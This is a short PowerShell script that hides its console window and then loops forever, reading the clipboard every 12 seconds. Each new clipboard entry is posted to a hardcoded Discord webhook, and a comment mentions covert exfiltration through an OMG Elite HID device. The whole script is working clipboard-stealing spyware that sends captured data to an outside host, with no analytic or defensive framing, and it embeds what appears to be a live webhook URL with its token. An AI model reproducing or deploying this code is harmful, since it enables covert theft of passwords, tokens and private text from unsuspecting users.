Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

$console = [Console.Window]::GetConsoleWindow()

# 0 hide
[Console.Window]::ShowWindow($console, 0) | Out-Null
function Clipboard-Creep 
{
    param (
        [int]$Sleep = 12,
        [string]$Webhook = "https://discord.com/api/webhooks/1377273360899244032/sfISpqX7vLusl2HGJ3Jwsirra-A6vPogZPUEsTTmYPgDVCXWnRIIGYy5UObuNX1P8wVF",
        # Requires OMG Elite device with firmware 3.0 & HIDX activated
        [switch]$CovertExfil
    )

    $empty = $null

    while ($true) {
    try {
        $current = Get-Clipboard -ErrorAction SilentlyContinue
    } catch {
        $current = ""
    }
    if ($current -and $current -ne $lastClipboard) {
        $message = "New clipboard content: $current"

        if ($Webhook) {
            Invoke-RestMethod -Uri $Webhook -Method Post -Body @{ content = $message } 
        } else {
            Write-Host $message
        }
        $lastClipboard = $current
    }

    Start-Sleep -Seconds $Sleep
}
}
Clipboard-Creep
